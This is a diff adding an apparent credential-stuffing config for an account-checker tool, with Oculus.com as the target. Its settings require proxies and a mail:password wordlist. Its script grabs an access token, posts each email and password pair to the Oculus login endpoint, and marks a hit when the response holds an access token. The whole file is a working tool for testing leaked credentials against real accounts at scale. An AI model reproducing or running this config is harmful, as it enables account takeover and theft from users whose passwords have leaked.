@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Oculus.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-29T11:52:32.4445808-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get_accessToken REQUEST GET "https://auth.oculus.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#parse_accessToken PARSE "<SOURCE>" LR "accessToken\":\"" "\"" -> VAR "accessToken" 
+
+REQUEST POST "https://graph.oculus.com/login" 
+  CONTENT "email=<USER>&password=<PASS>&access_token=<accessToken>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Login Credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#parse_access_token PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
